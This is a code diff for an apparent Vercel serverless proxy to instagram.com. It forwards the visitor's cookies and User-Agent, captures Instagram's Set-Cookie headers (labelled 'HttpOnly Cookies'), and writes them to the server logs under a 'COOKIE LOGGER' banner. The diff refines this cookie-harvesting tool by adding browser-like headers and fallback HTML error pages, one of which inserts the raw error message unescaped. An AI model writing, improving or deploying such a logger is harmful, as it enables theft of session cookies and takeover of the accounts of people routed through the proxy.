@@ -2,34 +2,40 @@
 
 export default async function handler(req, res) {
   try {
-    // 1. Fetch Instagram from the server side
+    // 1. Get the user's real User-Agent
+    const userUA = req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
+
+    // 2. Fetch Instagram with the user's UA and Cookies
     const response = await fetch('https://www.instagram.com/', {
       headers: {
-        'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'User-Agent': userUA, // Forward the user's UA
         'Cookie': req.headers['cookie'] || '',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Cache-Control': 'no-cache',
+        'Pragma': 'no-cache'
       },
     });
 
-    // 2. Extract HttpOnly Cookies from the response headers
-    const cookies = response.headers.getSetCookie().join('; ');
-
-    // 3. Log to Vercel Dashboard
+    // 3. Extract HttpOnly Cookies
+    const cookies = response.headers.getSetCookie();
+    
+    // Log cookies
     console.log('======================');
-    console.log('🍪 HTTPONLY COOKIE LOGGER');
+    console.log('🍪 COOKIE LOGGER');
     console.log('📅 Time:', new Date().toISOString());
-    console.log('🍪 HttpOnly Cookies:', cookies);
+    console.log('🍪 Cookies:', cookies);
     console.log('======================');
 
-    // 4. Stream the response body to the user
-    // Convert the ReadableStream to a Node.js Readable stream
+    // 4. Stream the response to the user
     const reader = response.body.getReader();
     
-    // Set headers
-    res.setHeader('Content-Type', response.headers.get('Content-Type') || 'text/html');
-    res.setHeader('Set-Cookie', cookies);
+    // Set response headers
+    res.setHeader('Content-Type', response.headers.get('Content-Type') || 'text/html; charset=utf-8');
+    cookies.forEach(c => res.setHeader('Set-Cookie', c));
     res.statusCode = response.status;
 
-    // Helper function to read chunks
+    // Stream chunks
     const streamToNode = async (reader, res) => {
       while (true) {
         const { done, value } = await reader.read();
@@ -41,14 +47,24 @@ export default async function handler(req, res) {
       }
     };
 
-    // Start streaming
     streamToNode(reader, res).catch(err => {
       console.error('Stream Error:', err);
-      res.status(500).end();
+      // If streaming fails, send a fallback HTML page
+      res.write('<html><body><h1>Instagram (Proxy)</h1><p>If you see this, the stream failed.</p></body></html>');
+      res.end();
     });
 
   } catch (error) {
     console.error('Proxy Error:', error);
-    res.status(500).json({ error: 'Internal Server Error' });
+    // Send a fallback HTML page on error
+    res.status(500).type('text/html').send(`
+      <html>
+        <body style="font-family: sans-serif; padding: 20px;">
+          <h1>Instagram (Proxy)</h1>
+          <p>Error: ${error.message}</p>
+          <p>Check Vercel Logs for details.</p>
+        </body>
+      </html>
+    `);
   }
 }
